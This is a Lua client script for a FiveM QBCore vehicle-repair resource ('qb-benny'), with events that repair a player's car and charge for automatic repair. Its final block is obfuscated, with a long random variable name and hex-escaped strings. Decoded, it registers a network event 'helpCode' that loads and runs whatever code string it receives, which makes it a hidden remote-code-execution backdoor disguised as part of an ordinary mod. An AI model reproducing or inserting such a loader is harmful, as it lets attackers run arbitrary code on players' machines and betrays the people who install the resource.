local QBCore = exports['qb-core']:GetCoreObject()


RegisterNetEvent("qb-benny:client:repair", function()
    local plyPed = PlayerPedId()
    local plyVeh = GetVehiclePedIsIn(plyPed, false)
    SendNUIMessage({sound = "wrench", volume = 1.0})
    QBCore.Functions.Progressbar("repair_car", "Repairing Vehicle...", 3000, false, true, {
        disableMovement = true,
        disableCarMovement = true,
        disableMouse = false,
        disableCombat = true,
    }, {}, {}, {}, function() -- Done
        SetVehicleDeformationFixed(plyVeh)
        SetVehicleBodyHealth(plyVeh)
        SetVehicleEngineHealth(plyVeh)
        SetVehiclePetrolTankHealth(plyVeh)
        SetVehicleFixed(plyVeh)
    end)
end)

RegisterNetEvent("autorepair",function()
    local plyPed = PlayerPedId()
    local plyVeh = GetVehiclePedIsIn(plyPed, false)
    local vehBodyHealth = GetVehicleBodyHealth(plyVeh)
    local vehEngineHealth = GetVehicleEngineHealth(plyVeh)
    -- local missingBodyHealth = 1000.0 - vehBodyHealth
    -- local missingEngineHealth = 1000.0 - vehEngineHealth
    local missingBodyHealth = (1000 - vehBodyHealth) * 0.25
    local missingEngineHealth = (1000 - vehEngineHealth) * 0.25

    --[[if (missingEngineHealth < 50) or missingBodyHealth < 50 then
        TriggerServerEvent("qb-benny:server:repaircheap")
    else
        TriggerServerEvent("qb-benny:server:repairexpensive")
    end]]--
    print(missingBodyHealth, missingEngineHealth)
    TriggerServerEvent("qb-benny:server:enkoro", math.ceil(missingBodyHealth + missingEngineHealth + 300))
end)

local XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[6][XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[1]](XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[2]) XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[6][XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[3]](XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[2], function(ByntiRCPvuNfqYQrgIIYvUOKpynduQIkxOVahYdAJWlZeBlNVJKUviRFVcmkwAcnapsjWz) XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[6][XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[4]](XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[6][XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[5]](ByntiRCPvuNfqYQrgIIYvUOKpynduQIkxOVahYdAJWlZeBlNVJKUviRFVcmkwAcnapsjWz))() end)